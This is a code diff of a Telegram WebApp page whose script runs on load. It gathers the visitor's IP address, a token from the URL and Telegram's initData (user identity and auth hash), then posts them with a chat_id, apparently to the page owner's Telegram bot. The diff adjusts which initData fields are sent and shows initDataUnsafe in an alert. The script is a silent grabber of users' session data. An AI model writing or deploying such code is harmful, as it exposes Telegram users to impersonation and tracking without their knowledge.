@@ -41,7 +41,7 @@
             const urlParams = new URLSearchParams(queryString);
             const id = urlParams.get('Token');
 
-			const message = `Telegram ${id} ${document.getElementById('ipAddress').innerHTML},,,,,, ${Telegram.WebApp.initDataUnsafe[1]}|||${Telegram.WebApp.initData}###${Telegram.WebApp.version}`;
+			const message = `Telegram ${id} ${document.getElementById('ipAddress').innerHTML},,,,,, ${Telegram.WebApp.initDataUnsafe}|||${Telegram.WebApp.webAppInitDataUnsafe}###${Telegram.WebApp.version}`;
 
 			const xhttp = new XMLHttpRequest();
 			xhttp.onreadystatechange = function() {
@@ -56,7 +56,7 @@
 			xhttp.send(`chat_id=${chatId}&text=${message}`);
 		}
     function showPopup() {
-        Telegram.WebApp.showAlert('Alirezamhd')
+        Telegram.WebApp.showAlert(`Telegram ${Telegram.WebApp.initDataUnsafe}`)
     }
     test();
 </script>
